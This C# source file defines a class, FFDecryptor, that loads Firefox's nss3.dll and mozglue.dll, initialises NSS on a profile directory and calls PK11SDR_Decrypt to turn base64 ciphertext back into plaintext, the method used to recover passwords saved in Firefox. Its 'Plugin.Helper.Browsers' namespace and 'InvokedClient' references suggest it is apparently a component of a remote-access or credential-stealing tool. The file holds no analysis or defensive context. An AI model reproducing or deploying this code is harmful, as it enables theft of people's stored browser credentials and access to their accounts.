

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;


namespace Plugin.Helper.Browsers
{
	public class FFDecryptor : IDisposable
	{
		private FFDecryptor.NssInit NSS_Init;
		private FFDecryptor.NssShutdown NSS_Shutdown;
		private FFDecryptor.Pk11sdrDecrypt PK11SDR_Decrypt;
		private IntPtr NSS3;
		private IntPtr Mozglue;

		public long Init(string configDirectory)
		{
			string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Mozilla Firefox\\");
			this.Mozglue = InvokedClient.Utilities.NativeMethods.LoadLibrary(Path.Combine(path1, "mozglue.dll"));
			this.NSS3 = InvokedClient.Utilities.NativeMethods.LoadLibrary(Path.Combine(path1, "nss3.dll"));
			IntPtr procAddress1 = InvokedClient.Utilities.NativeMethods.GetProcAddress(this.NSS3, "NSS_Init");
			IntPtr procAddress2 = InvokedClient.Utilities.NativeMethods.GetProcAddress(this.NSS3, "NSS_Shutdown");
			IntPtr procAddress3 = InvokedClient.Utilities.NativeMethods.GetProcAddress(this.NSS3, "PK11SDR_Decrypt");
			this.NSS_Init = (FFDecryptor.NssInit) Marshal.GetDelegateForFunctionPointer(procAddress1, typeof (FFDecryptor.NssInit));
			this.PK11SDR_Decrypt = (FFDecryptor.Pk11sdrDecrypt) Marshal.GetDelegateForFunctionPointer(procAddress3, typeof (FFDecryptor.Pk11sdrDecrypt));
			this.NSS_Shutdown = (FFDecryptor.NssShutdown) Marshal.GetDelegateForFunctionPointer(procAddress2, typeof (FFDecryptor.NssShutdown));
			return this.NSS_Init(configDirectory);
		}

		public string Decrypt(string cypherText)
		{
			IntPtr num = IntPtr.Zero;
			StringBuilder stringBuilder = new StringBuilder(cypherText);
			try
			{
				byte[] source = Convert.FromBase64String(cypherText);
				num = Marshal.AllocHGlobal(source.Length);
				Marshal.Copy(source, 0, num, source.Length);
				FFDecryptor.TSECItem result = new FFDecryptor.TSECItem();
				var shit = new FFDecryptor.TSECItem()
				{
					SECItemType = 0,
					SECItemData = num,
					SECItemLen = source.Length
				};

                if (this.PK11SDR_Decrypt(ref shit, ref result, 0) == 0)
				{
					if (result.SECItemLen != 0)
					{
						byte[] numArray = new byte[result.SECItemLen];
						Marshal.Copy(result.SECItemData, numArray, 0, result.SECItemLen);
						return Encoding.ASCII.GetString(numArray);
					}
				}
			}
			catch (Exception ex)
			{
				return (string) null;
			}
			finally
			{
				if (num != IntPtr.Zero)
					Marshal.FreeHGlobal(num);
			}
			return (string) null;
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object) this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			long num = this.NSS_Shutdown();
			InvokedClient.Utilities.NativeMethods.FreeLibrary(this.NSS3);
			InvokedClient.Utilities.NativeMethods.FreeLibrary(this.Mozglue);
		}

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long NssInit(string configDirectory);

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long NssShutdown();

		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int Pk11sdrDecrypt(
			ref FFDecryptor.TSECItem data,
			ref FFDecryptor.TSECItem result,
			int cx);

		public struct TSECItem
		{
			public int SECItemType;
			public IntPtr SECItemData;
			public int SECItemLen;
		}
	}
}
